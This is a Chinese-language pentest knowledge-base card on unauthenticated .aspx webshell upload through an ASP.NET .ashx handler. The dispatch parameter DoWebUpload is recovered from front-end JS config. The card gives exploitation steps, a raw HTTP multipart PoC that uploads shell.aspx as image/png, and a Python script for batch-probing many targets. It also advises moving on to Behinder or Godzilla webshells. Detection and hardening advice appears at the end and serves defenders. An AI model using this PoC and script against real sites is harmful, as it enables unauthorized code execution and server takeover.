---
id: web-generic-file-upload-ashx-method-dispatch-frontend-js-unauth-aspx
title: .NET ashx 处理器参数未知时的突破：从前端 JS 配置读出 method 分发值，未授权 DoWebUpload 直接落 aspx webshell
type: scenario
domain: web
path: web/generic/file-upload
technique: ashx-method-dispatch-frontend-js-config-unauth-upload
tags:
- web
- file-upload
- dotnet
- ashx
- unauthorized
- aspx
- webshell
- recon
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W1
  verified_at: '2026-11-08T11:40:43+08:00'
  notes: 已对照原文核对；原文直接访问 .ashx 返回 success:false 与「错误的接口名称」，前端 JS 配置块 File:{url:/api/FileUploadApi.ashx, upload:DoWebUpload, del:DoDelete} 给出分发键与值，改用 ?method=DoWebUpload 上传 shell.aspx 后响应 data.WebPath/WebRelPath 回显 /fileRoot/WebUpload/file/20241230/shell.aspx 并冰蝎连接成功，与卡片一致。注意：原文回显路径含连续双斜杠（/file//20241230/），卡片写为单斜杠属归一化表述。未验证点：原文未展示 .aspx 实际解析输出与 w3wp 账户权限，卡片该部分属机制推断；批量脚本为逐行 URL 循环、非并发，与卡片第 6 步一致
url: /docs/web/generic/file-upload/web-generic-file-upload-ashx-method-dispatch-frontend-js-unauth-aspx/
draft: false
kb_aliases:
- ashx 参数爆破失败
- FileUploadApi.ashx DoWebUpload
- 前端 JS 配置泄露上传接口参数
- ashx method 分发
- 未授权 ashx 上传 aspx
---

## 一句话结论

访问 `.ashx` 处理器只返回「接口错误」通常不是接口不可用，而是缺少它用来分发的 `method` 类参数：这类 ASP.NET 站点常把 `upload`/`del` 等分发值写进前端 JS 的配置对象（形如 `File: { url: "/api/FileUploadApi.ashx", upload: "DoWebUpload", del: "DoDelete" }`），从 JS 里直接读出该值后补到查询串，即可在**未认证**状态下用 multipart 上传 `.aspx` 文件，落地到 Web 可访问目录并连接 webshell。

## 原理

- **`.ashx` 是单一入口 + 内部路由**：ASP.NET 的通用处理程序（Generic Handler）不含页面生命周期，一个 `.ashx` 文件往往通过 `context.Request["method"]`/`action` 之类的键在 `ProcessRequest` 里 switch 分发到多个方法（上传、删除、列表）。因此只请求 handler 本体时，`method` 缺失会走 default 分支返回统一的「接口错误」文案，看起来像接口不存在或参数非法。
- **为什么参数爆破不奏效**：字典爆破参数名只覆盖常见命名（`action`/`type`/`op`/`cmd`），而分发键和值往往是开发者自定义的（本例键 `method`、值 `DoWebUpload`/`DoDelete`），值域不是常见词，枚举成本很高。前端的配置文件反而把「键名 + 值」成对写死，是零成本的信息源。
- **为什么未授权也能上传**：handler 里只做了「取参数 → 判文件非空 → 保存」，没有校验登录态/Session/Token（或校验只在页面层做、ashx 直接可达）。上传逻辑按原始文件名保存，扩展名未过滤，落盘目录又在站点内（如 `/fileRoot/WebUpload/file/<日期>/`），IIS 按 `.aspx` 映射到 ASP.NET 处理器，请求即编译执行。
- **危害放大的两点**：其一，`.ashx` 处理器常被配置为匿名可访问（登录框页面与 API 不在同一鉴权域）；其二，上传成功响应里会回显完整 Web 路径，攻击者不需要猜目录。

## 触发条件

- 目标为 ASP.NET/.NET 站点，存在 `.ashx` 处理器（常见名 `FileUploadApi.ashx`、`Common.ashx`、`Upload.ashx`），且未对该 handler 做认证。
- 前端 SPA 的 JS/配置里存在接口对象，把 handler 路径与分发方法名一起暴露（`url` + `upload`/`del` 等字段）。
- 上传逻辑不校验扩展名或只用可绕过的弱校验；落盘目录位于 Web 根内且 IIS 允许 `.aspx` 执行。
- 能访问到该 handler（无需登录），或登录框旁即可直接请求 API 路径。

## 利用步骤

1. 目录扫描发现 `.ashx` 列表（`api/*.ashx`、`ashx/*.ashx`、UEditor 的 `controller.ashx` 等），先直接 GET 观察返回；若返回统一错误文案，记录该文案作为后续成功/失败的基线。
2. 不要盲爆破参数值：先抓取站点前端 JS（`app.js`、`main.*.js`、`config.js`、SPA 路由 chunk），全局搜索 handler 文件名，找到形如 `File: { url, upload, del }` 的配置块，读出分发键与值。
3. 用读出的值构造请求：`POST /api/FileUploadApi.ashx?method=DoWebUpload`，multipart 提交 `file` 字段，文件名填 `.aspx`（内容先用最小标记页验证解析，如输出当前时间）。
4. 从响应 JSON 中读取回显的 Web 路径（如 `/fileRoot/WebUpload/file/20241230/shell.aspx`），直接请求该路径确认代码执行。
5. 将内容替换为冰蝎/哥斯拉等加密 webshell 或命令执行马，用客户端连接验证权限（w3wp 应用池账户）。
6. 批量验证时，用脚本对目标清单逐个跑同一请求（把 payload 与文件名固定），按响应状态与回显路径判定；注意限速与授权范围。

## PoC

```http
POST /api/FileUploadApi.ashx?method=DoWebUpload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----wb
Origin: null

------wb
Content-Disposition: form-data; name="file"; filename="shell.aspx"
Content-Type: image/png

<%@ Page Language="C#" %><% Response.Write(DateTime.Now.ToString()); %>
------wb--
```

```text
HTTP/1.1 200 OK
{"success":true,"msg":"","data":{"WebPath":"http://target/fileRoot/WebUpload/file/20241230/shell.aspx","WebRelPath":"/fileRoot/WebUpload/file/20241230/shell.aspx"}}
```

```python
import requests

def probe(url):
    api = url + "/api/FileUploadApi.ashx?method=DoWebUpload"
    payload = '<%@ Page Language="C#" %><% Response.Write(DateTime.Now.ToString()); %>'
    files = {"file": ("shell.aspx", payload, "image/png")}
    try:
        r = requests.post(api, files=files, timeout=5)
        print(r.status_code, r.text[:200])
        return r.json().get("data", {}).get("WebPath")
    except Exception as e:
        print("err", e)
```

```text
# 从 JS 配置读出分发值（人工在 devtools/文件里搜索 handler 文件名）
File: { url: "/api/FileUploadApi.ashx", upload: "DoWebUpload", del: "DoDelete" }
```

## 变体与关联

- **分发键变体**：也可能是 `action`、`type`、`op`、`do`；值可能是 `upload`/`Upload`/`uploadFile`/`DoUpload`。若 JS 里没有，退化为读 `.ashx` 的公开源码或错误栈（调试模式）。
- **校验变体**：若扩展名被黑名单拦住，改用 `.ashx`/`.asmx`/`.cshtml`/`.config` 等 IIS 可解析类型，见 [[web-generic-file-upload-dotnet-blacklist-only-asp-aspx]]。
- **认证变体**：handler 要求 Cookie（`.ASPXAUTH`）时，先完成登录或用其他接口拿到会话；UEditor 类入口见 [[web-generic-file-upload-ueditor-net-controller-contenttype-aspx]]。
- **入口发现变体**：前端配置对象的提取方法（webpack chunk、sourcemap、SPA 路由）见 [[pentest-recon-webpack-apiurlkey-endpoint-extraction]]；同类的 ashx 未授权上传案例见 [[web-generic-file-upload-jiuyin-common-uploadtemppicture-aspx]]。
- **边界**：上传目录被配置为禁止脚本执行、handler 有统一鉴权过滤器、文件名被强制重命名为无后缀时，本链退化为任意文件写入或存储型 XSS。

## 检测与防御

- **检测**：Web 日志中出现对 `.ashx` 的 POST 且查询串带 `method=`/`action=`；同一 IP 在未登录状态下连续请求上传 handler；上传文件名以 `.aspx`/`.ashx`/`.asmx` 结尾而 Content-Type 为图片；`/fileRoot/WebUpload/` 等目录新增脚本文件并在上传后数秒内被访问。
- **检测（代码侧）**：审计 `.ashx` 的 `ProcessRequest`，确认每个分发分支都调用了统一的鉴权方法；检查保存路径是否落在 Web 根内。
- **修复**：给所有 `.ashx` 加统一认证与授权过滤器（不要依赖页面级登录）；上传接口做扩展名白名单 + 文件头魔数校验 + 服务端重命名为随机无后缀名；上传目录移出 Web 根或对脚本扩展做请求筛选拒绝。
- **加固**：前端配置文件不要把内部分发方法名与调试参数一起打包发布，减少接口自描述信息；对上传目录做只读挂载/独立域名，并设置 `Content-Disposition: attachment`。
